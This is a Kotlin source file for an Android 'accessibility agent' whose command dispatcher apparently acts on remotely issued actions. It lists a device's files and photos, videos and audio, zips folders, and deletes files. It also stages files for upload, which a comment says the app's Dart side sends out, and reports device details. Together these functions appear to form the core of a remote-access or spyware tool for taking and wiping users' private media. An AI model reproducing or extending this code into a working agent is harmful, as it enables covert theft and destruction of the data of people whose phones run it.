package com.example.cyber_accessibility_agent

import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import java.io.*
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.collections.ArrayList

object CommandDispatcher {
    private const val TAG = "CommandDispatcher"

    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        return try {
            when (action) {
                "list_files" -> listFiles(context, payload)
                "list_images" -> listMedia(context, MediaType.IMAGE, payload)
                "list_videos" -> listMedia(context, MediaType.VIDEO, payload)
                "list_audio" -> listMedia(context, MediaType.AUDIO, payload)
                "upload_file", "prepare_upload" -> prepareUpload(context, payload)
                "zip_files", "zip_file" -> zipPath(context, payload)
                "delete_file", "rm", "remove" -> deleteFile(context, payload)
                "device_info", "info" -> deviceInfo(context)
                "ping" -> ping(context)
                else -> mapOf("success" to false, "error" to "unknown_action", "action" to action)
            }
        } catch (e: Exception) {
            Log.w(TAG, "dispatch error: ${e.message}", e)
            mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    private enum class MediaType { IMAGE, VIDEO, AUDIO }

    // LIST MEDIA (images/videos/audio) via MediaStore
    private fun listMedia(context: Context, type: MediaType, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val projection: Array<String>
        val collection: Uri
        val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"

        when (type) {
            MediaType.IMAGE -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_MODIFIED
                )
            }
            MediaType.VIDEO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_MODIFIED
                )
            }
            MediaType.AUDIO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_MODIFIED
                )
            }
        }

        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val prefix = (payload["prefix"] as? String)?.trim()

        val selection = if (!prefix.isNullOrEmpty()) {
            "${MediaStore.MediaColumns.DISPLAY_NAME} LIKE ?"
        } else null
        val selectionArgs = if (!prefix.isNullOrEmpty()) arrayOf("$prefix%") else null

        val cursor: Cursor? = try {
            context.contentResolver.query(
                collection,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
        } catch (e: Exception) {
            Log.w(TAG, "media query failed: ${e.message}", e)
            null
        }

        cursor?.use { c ->
            var count = 0
            while (c.moveToNext() && count < limit) {
                val idVal = try { c.getLong(c.getColumnIndexOrThrow(projection[0])) } catch (_: Exception) { 0L }
                val name = try { c.getString(c.getColumnIndexOrThrow(projection[1])) ?: "" } catch (_: Exception) { "" }
                val size = try { c.getLong(c.getColumnIndexOrThrow(projection[2])) } catch (_: Exception) { 0L }
                val date = try { c.getLong(c.getColumnIndexOrThrow(projection[3])) } catch (_: Exception) { 0L }

                val contentUri = ContentUris.withAppendedId(collection, idVal)

                results.add(
                    mapOf(
                        "id" to idVal.toString(),
                        "display_name" to name,
                        "size" to size,
                        "date_modified" to date,
                        "uri" to contentUri.toString()
                    )
                )
                count++
            }
        }

        return mapOf("success" to true, "count" to results.size, "files" to results)
    }

    // LIST FILES (filesystem path + content URI support)
    private fun listFiles(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val rawPath = (payload["path"] ?: payload["dir"] ?: "/storage/emulated/0/").toString()
        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val recursive = payload["recursive"] == true || payload["recursive"] == "true"

        try {
            // content URI: return single entry metadata
            if (rawPath.startsWith("content://")) {
                val uri = Uri.parse(rawPath)
                val meta = querySingleContentUri(context, uri)
                if (meta != null) results.add(meta)
                return mapOf("success" to true, "count" to results.size, "files" to results)
            }

            val f = File(rawPath)
            if (!f.exists()) {
                return mapOf("success" to false, "error" to "path_not_found")
            }

            if (f.isFile) {
                results.add(fileMetaMap(f))
            } else {
                val stack = ArrayDeque<File>()
                stack.add(f)
                var collected = 0
                while (stack.isNotEmpty() && collected < limit) {
                    val cur = stack.removeFirst()
                    val children = cur.listFiles() ?: continue
                    children.sortWith(Comparator { a, b -> b.lastModified().compareTo(a.lastModified()) })
                    for (c in children) {
                        if (collected >= limit) break
                        results.add(fileMetaMap(c))
                        collected++
                        if (recursive && c.isDirectory) {
                            stack.add(c)
                        }
                    }
                }
            }

            return mapOf("success" to true, "count" to results.size, "files" to results)
        } catch (e: Exception) {
            Log.w(TAG, "listFiles error: ${e.message}", e)
            return mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    private fun querySingleContentUri(context: Context, uri: Uri): Map<String, Any?>? {
        return try {
            val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.DATE_MODIFIED)
            val c = context.contentResolver.query(uri, proj, null, null, null)
            c?.use {
                if (it.moveToFirst()) {
                    val idVal = try { it.getLong(it.getColumnIndexOrThrow(proj[0])) } catch (_: Exception) { 0L }
                    val name = try { it.getString(it.getColumnIndexOrThrow(proj[1])) ?: "" } catch (_: Exception) { "" }
                    val size = try { it.getLong(it.getColumnIndexOrThrow(proj[2])) } catch (_: Exception) { 0L }
                    val date = try { it.getLong(it.getColumnIndexOrThrow(proj[3])) } catch (_: Exception) { 0L }
                    mapOf(
                        "id" to idVal.toString(),
                        "display_name" to name,
                        "size" to size,
                        "date_modified" to date,
                        "uri" to uri.toString()
                    )
                } else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "querySingleContentUri failed: ${e.message}", e)
            null
        }
    }

    private fun fileMetaMap(f: File): Map<String, Any?> {
        return mapOf(
            "path" to f.absolutePath,
            "name" to f.name,
            "is_dir" to f.isDirectory,
            "size" to if (f.isFile) f.length() else 0L,
            "last_modified" to f.lastModified()
        )
    }

    // DELETE (file path or content URI)
    private fun deleteFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["filename"] ?: payload["target"] ?: "").toString()
        if (path.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        return try {
            if (path.startsWith("content://")) {
                val uri = Uri.parse(path)
                val deleted = context.contentResolver.delete(uri, null, null)
                mapOf("success" to (deleted > 0), "deleted" to deleted)
            } else {
                val f = File(path)
                val ok = if (f.exists()) f.delete() else false
                mapOf("success" to ok, "deleted" to if (ok) 1 else 0)
            }
        } catch (e: Exception) {
            Log.w(TAG, "deleteFile error: ${e.message}", e)
            mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    // ZIP (zip_files)
    private fun zipPath(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val rawPath = (payload["path"] ?: payload["file"] ?: "").toString()
        if (rawPath.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        val dest = (payload["dest"] ?: "").toString()
        val zipName = (payload["zip_name"] ?: payload["zip"] ?: "").toString()

        return try {
            val src = File(rawPath)
            if (!src.exists()) return mapOf("success" to false, "error" to "path_not_found")

            val zipFile = if (dest.isNotEmpty()) File(dest) else {
                val defaultName = if (zipName.isNotEmpty()) zipName else "mediaagent_${System.currentTimeMillis()}.zip"
                File(context.cacheDir, defaultName)
            }

            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                if (src.isDirectory) {
                    zipDirectory(src, src.name, zos)
                } else {
                    zipSingleFile(src, zos)
                }
            }

            mapOf("success" to true, "zip_path" to zipFile.absolutePath, "size" to zipFile.length())
        } catch (e: Exception) {
            Log.w(TAG, "zipPath error: ${e.message}", e)
            mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    private fun zipDirectory(folder: File, baseName: String, zos: ZipOutputStream) {
        val files = folder.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) {
                zipDirectory(f, "$baseName/${f.name}", zos)
            } else {
                zipSingleFile(f, zos, "$baseName/${f.name}")
            }
        }
    }

    private fun zipSingleFile(file: File, zos: ZipOutputStream, entryName: String? = null) {
        val entry = ZipEntry(entryName ?: file.name)
        zos.putNextEntry(entry)
        FileInputStream(file).use { fis ->
            val buffer = ByteArray(8192)
            var read = fis.read(buffer)
            while (read > 0) {
                zos.write(buffer, 0, read)
                read = fis.read(buffer)
            }
        }
        zos.closeEntry()
    }

    // PREPARE UPLOAD: return metadata (Dart side will perform upload via edge function)
    private fun prepareUpload(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val filename = (payload["filename"] ?: payload["path"] ?: "").toString()
        if (filename.isEmpty()) return mapOf("success" to false, "error" to "missing filename")

        try {
            if (filename.startsWith("content://")) {
                val uri = Uri.parse(filename)
                val meta = querySingleContentUri(context, uri)
                return mapOf(
                    "success" to true,
                    "is_content_uri" to true,
                    "uri" to filename,
                    "meta" to meta
                )
            } else {
                val f = File(filename)
                if (!f.exists()) return mapOf("success" to false, "error" to "file_not_found")
                return mapOf(
                    "success" to true,
                    "is_content_uri" to false,
                    "file_path" to f.absolutePath,
                    "size" to f.length(),
                    "name" to f.name
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "prepareUpload error: ${e.message}", e)
            return mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    // DEVICE INFO & PING
    private fun deviceInfo(context: Context): Map<String, Any?> {
        return try {
            val pkg = context.packageName
            val free = try { context.filesDir.freeSpace } catch (_: Exception) { 0L }
            mapOf(
                "success" to true,
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "sdk_int" to Build.VERSION.SDK_INT,
                "package" to pkg,
                "cache_dir" to context.cacheDir.absolutePath,
                "files_free" to free
            )
        } catch (e: Exception) {
            Log.w(TAG, "deviceInfo error: ${e.message}", e)
            mapOf("success" to false, "error" to (e.message ?: "exception"))
        }
    }

    private fun ping(context: Context): Map<String, Any?> {
        return mapOf("success" to true, "ts" to System.currentTimeMillis(), "model" to Build.MODEL)
    }
}